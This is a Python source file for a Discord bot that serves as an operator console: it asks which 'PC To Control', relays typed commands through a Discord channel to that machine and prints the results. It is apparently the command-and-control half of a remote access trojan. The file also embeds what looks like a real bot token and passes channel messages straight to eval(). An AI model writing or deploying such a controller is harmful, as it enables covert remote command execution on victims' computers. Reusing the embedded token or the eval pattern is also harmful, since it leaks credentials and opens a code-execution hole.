import discord
from discord.ext import commands
import colorama
import os

# Replace 'your_bot_token' with your actual bot token
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
token = "MTA2MTM4NTIzMTQxODAwNzY3Mg.GDLONS.xDrocX9QKLWyNWSEXQA9beNZ2T6O7m0s8klPMs"

@bot.event
async def on_ready():
    pass

@bot.event
async def on_message(message=discord.Message):
    if message.content.startswith(".start"):
        pcID = input("PC To Control>")
        os.system("cls")
        await message.channel.send(f".{pcID}")
        msg = await bot.wait_for("message")
        msgReturn = eval(msg.content)
        while True:
            command = input(msgReturn[0] + ">")
            await message.channel.send(f".{pcID} {command}")
            msg = await bot.wait_for("message")
            msgReturn = eval(msg.content)
            if msgReturn[1] != "Command doesnt exist, or there was another problem that lead up to an error": print("\n" + msgReturn[1] + "\n")
            else: print(f"{colorama.Fore.LIGHTRED_EX}{msgReturn[1]}{colorama.Fore.WHITE}")



colorama.init()
bot.run(token)